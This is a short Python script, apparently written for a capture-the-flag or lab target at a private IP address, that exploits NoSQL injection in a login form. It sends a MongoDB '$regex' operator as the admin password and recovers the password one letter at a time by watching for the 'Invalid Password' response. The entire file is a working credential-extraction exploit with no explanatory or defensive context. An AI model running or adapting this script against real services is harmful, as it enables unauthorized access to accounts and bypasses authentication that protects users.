import requests
import json
import string
import sys

def login(pw):
    payload = '{ "$regex": "%s" }' % pw
    data = { "user":"admin", "password": json.loads(payload) }
    r = requests.post("http://10.129.96.160:5000/login", json=data)
    if "Invalid Password" in r.text:
        return False
    return True

password = '^'
stop = False

while stop == False:
    for i in string.ascii_letters:
        sys.stdout.write(f"\r{password}{i}")
        if login(f"{password}{i}"):
            password += i
            if login(f"{password}$"):
                sys.stdout.write(f"\r{password}\r\n")
                sys.stdout.flush()
                stop = True
                break
            break
